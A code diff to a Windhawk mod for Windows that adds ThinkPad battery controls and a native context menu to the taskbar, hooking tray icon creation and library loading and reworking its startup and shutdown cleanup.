+            if (auto e = binding.element.get()) {
+              e.ContextRequested(binding.token);
+              e.RemoveHandler(UIElement::RightTappedEvent(), binding.rightHandler);
+              e.RemoveHandler(UIElement::KeyDownEvent(), binding.keyHandler);
+            }
+          bindings->clear();
           auto root = GetTaskbarXamlRoot(taskbar.load());
           if (root)
             Scan(root.Content());
@@ -3056,20 +3954,64 @@ void AttachNativeMenu() {
       },
       nullptr);
 }
-// BEGIN TESTABLE INITIALIZATION GUARD
-std::atomic<bool> initializationStarted = false;
-bool BeginInitialization() {
-  return !initializationStarted.exchange(true);
-}
-// END TESTABLE INITIALIZATION GUARD
-BOOL Wh_ModInit() {
-  // Never revive globals while old delegates or workers may still reference them.
-  if (!BeginInitialization()) {
-    OutputDebugStringW(
-        L"ThinkPad Battery Controls: retained instance cannot restart safely. Restart Explorer or "
-        L"sign out before enabling again.");
-    return FALSE;
+using IconViewConstructor = void*(WINAPI*)(void*);
+IconViewConstructor iconViewConstructorOriginal = nullptr;
+[[clang::no_destroy]] std::optional<std::list<FrameworkElement::Loaded_revoker>> iconLoadedEvents{
+    std::in_place};
+void* WINAPI IconViewConstructorHook(void* self) {
+  void* result = iconViewConstructorOriginal(self);
+  if (unloading)
+    return result;
+  try {
+    FrameworkElement view = nullptr;
+    reinterpret_cast<IUnknown**>(self)[1]->QueryInterface(winrt::guid_of<FrameworkElement>(),
+                                                          winrt::put_abi(view));
+    if (!view)
+      return result;
+    auto item = iconLoadedEvents->emplace(iconLoadedEvents->end());
+    *item = view.Loaded(winrt::auto_revoke, [item](auto const& sender, auto const&) noexcept {
+      iconLoadedEvents->erase(item);
+      if (unloading)
+        return;
+      try {
+        taskbar = FindWindowW(L"Shell_TrayWnd", nullptr);
+        Scan(sender.template as<DependencyObject>());
+      } catch (...) {
+        Wh_Log(L"Unable to attach newly loaded tray icon");
+      }
+    });
+  } catch (...) {
+    Wh_Log(L"Unable to watch tray icon creation");
   }
+  return result;
+}
+std::atomic<bool> trayHooked = false;
+HMODULE TrayModule() {
+  auto module = GetModuleHandleW(L"SystemTray.dll");
+  if (!module)
+    module = GetModuleHandleW(L"Taskbar.View.dll");
+  return module;
+}
+bool HookTray(HMODULE module) {
+  // SystemTray.dll, Taskbar.View.dll
+  WindhawkUtils::SYMBOL_HOOK hooks[] = {
+      {{LR"(public: __cdecl winrt::SystemTray::implementation::IconView::IconView(void))"},
+       &iconViewConstructorOriginal,
+       IconViewConstructorHook}};
+  return HookSymbols(module, hooks, ARRAYSIZE(hooks));
+}
+decltype(&LoadLibraryExW) loadLibraryOriginal = nullptr;
+HMODULE WINAPI LoadLibraryHook(PCWSTR name, HANDLE file, DWORD flags) {
+  HMODULE module = loadLibraryOriginal(name, file, flags);
+  if (!unloading && module && module == TrayModule() && !trayHooked.exchange(true)) {
+    if (HookTray(module))
+      Wh_ApplyHookOperations();
+    else
+      Wh_Log(L"Tray creation hook unavailable");
+  }
+  return module;
+}
+BOOL Wh_ModInit() {
   try {
     taskbar = FindWindowW(L"Shell_TrayWnd", nullptr);
     DWORD pid = 0;
@@ -3084,7 +4026,18 @@ BOOL Wh_ModInit() {
       symbolsReady = false;
     }
     if (!symbolsReady)
-      Engine::Log(L"Taskbar symbols unavailable; recovery worker remains active.");
+      Wh_Log(L"Taskbar symbols unavailable; recovery worker remains active.");
+    auto tray = TrayModule();
+    if (tray) {
+      trayHooked = true;
+      if (!HookTray(tray))
+        Wh_Log(L"Tray creation hook unavailable");
+    } else {
+      auto load = reinterpret_cast<decltype(&LoadLibraryExW)>(
+          GetProcAddress(GetModuleHandleW(L"kernelbase.dll"), "LoadLibraryExW"));
+      if (!WindhawkUtils::SetFunctionHook(load, LoadLibraryHook, &loadLibraryOriginal))
+        return FALSE;
+    }
     using namespace BatteryControls;
     stopEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
     wakeEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);
@@ -3108,7 +4061,15 @@ BOOL Wh_ModInit() {
     return FALSE;
   }
 }
-void Wh_ModAfterInit() {}
+void Wh_ModAfterInit() {
+  if (!trayHooked)
+    if (auto tray = TrayModule())
+      if (!trayHooked.exchange(true)) {
+        if (HookTray(tray))
+          Wh_ApplyHookOperations();
+      }
+  AttachNativeMenu();
+}
 void Wh_ModSettingsChanged() {
   BatteryControls::Submit(0);
 }
@@ -3118,65 +4079,28 @@ void Wh_ModBeforeUninit() {
   shutdownDeadline = GetTickCount64() + 4000;
   if (stopEvent)
     SetEvent(stopEvent);
-  // Child execution has bounded cancellation. Pump only sent messages so a
-  // worker's already-running taskbar dispatch can finish before UI cleanup.
-  if (threadHandle) {
-    auto until = GetTickCount64() + 12000;
-    while (WaitForSingleObject(threadHandle, 0) == WAIT_TIMEOUT) {
-      if (GetTickCount64() >= until) {
-        RetainModule(L"charging worker did not stop within 12 seconds");
-        Status(L"Worker shutdown deferred; recovery remains saved.");
-        Engine::Close();
-        return;
+  if (threadHandle)
+    WaitForSingleObject(threadHandle, INFINITE);
+  auto cleanup = [](void*) {
+    ModernUI::Close();
+    ModernUI::uiRevokers.reset();
+    for (auto& binding : *bindings)
+      if (auto element = binding.element.get()) {
+        element.ContextRequested(binding.token);
+        element.RemoveHandler(UIElement::RightTappedEvent(), binding.rightHandler);
+        element.RemoveHandler(UIElement::KeyDownEvent(), binding.keyHandler);
       }
-      MsgWaitForMultipleObjects(1, &threadHandle, FALSE, 50, QS_SENDMESSAGE);
-      MSG message;
-      PeekMessageW(&message, nullptr, 0, 0, PM_NOREMOVE);
-    }
-  }
-  try {
-    bool cleaned = !taskbar.load() ||
-                   RunFromWindowThread(
-                       taskbar.load(),
-                       [](void*) {
-                         try {
-                           ModernUI::Close();
-                           for (auto& binding : bindings)
-                             if (auto e = binding.element.get())
-                               e.RemoveHandler(UIElement::RightTappedEvent(), binding.handler);
-                           bindings.clear();
-                         } catch (...) {
-                           RetainModule(L"UI cleanup callback threw");
-                           BatteryControls::Status(
-                               L"UI cleanup failed. Module retained until Explorer exits.");
-                         }
-                       },
-                       nullptr);
-    if (!cleaned)
-      RetainModule(L"taskbar cleanup dispatch failed");
-  } catch (...) {
-    RetainModule(L"taskbar cleanup dispatch threw");
-  }
+    bindings.reset();
+    iconLoadedEvents.reset();
+  };
+  if (taskbar)
+    RunFromWindowThread(taskbar, cleanup, nullptr);
 }
 void Wh_ModUninit() {
   using namespace BatteryControls;
-  Engine::Close();
-  if (setupThread && WaitForSingleObject(setupThread.load(), 0) != WAIT_OBJECT_0)
-    RetainModule(L"setup thread still awaiting approval or process completion");
-  // Revoked delegates can be released asynchronously by XAML. Do not wait
-  // forever, and never unload while a remaining delegate can call our code.
-  auto until = GetTickCount64() + 2000;
-  while (winrt::get_module_lock() != 0 && GetTickCount64() < until)
-    Sleep(20);
-  if (winrt::get_module_lock() != 0)
-    RetainModule(L"XAML delegates remain after bounded drain");
-  else
-    OutputDebugStringW(L"ThinkPad Battery Controls: XAML delegates drained.\n");
-  if (retainModule)
-    return;
-  if (setupThread)
-    CloseHandle(setupThread.load());
-  setupThread = nullptr;
+  // UI handlers and worker are gone; wait for delegates already being released by XAML.
+  while (winrt::get_module_lock() != 0)
+    Sleep(10);
   if (threadHandle)
     CloseHandle(threadHandle);
   if (stopEvent)
